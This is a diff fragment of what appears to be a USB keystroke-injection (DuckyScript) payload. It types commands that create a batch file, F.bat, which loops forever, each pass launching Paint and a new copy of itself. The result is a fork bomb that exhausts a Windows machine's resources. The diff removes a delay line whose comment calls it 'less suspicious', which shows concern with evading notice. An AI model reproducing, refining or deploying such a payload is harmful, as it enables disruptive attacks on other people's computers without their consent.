@@ -23,9 +23,6 @@ ENTER
 DELAY 100
 STRING copy con F.bat
 ENTER
-REM Some bat delay (Less suspicious)
-STRING >nul ping 127.0.0.1 -n 10
-ENTER
 STRING :A
 ENTER
 STRING start mspaint.exe && start F.bat
